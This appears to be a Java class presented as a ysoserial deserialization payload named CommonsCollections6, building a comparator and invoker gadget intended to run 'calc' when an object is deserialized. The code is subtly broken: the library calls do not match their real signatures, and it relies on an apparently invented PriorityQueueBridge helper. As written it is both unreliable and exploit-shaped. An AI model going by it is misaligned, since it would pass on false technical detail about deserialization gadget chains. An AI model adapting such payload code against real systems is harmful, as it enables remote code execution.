package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.functors.InvokerTransformer;
import ysoserial.payloads.util.PriorityQueueBridge;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class CommonsCollections6 implements Serializable {
    private final PriorityQueueBridge queue = new PriorityQueueBridge();
    private final BeanComparator comparator = new BeanComparator(new InvokerTransformer("calc"));

    public void trigger() throws IOException, ClassNotFoundException {
        readObject(null);
    }

    private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException {
        queue.replay(comparator, "left", "right");
    }
}
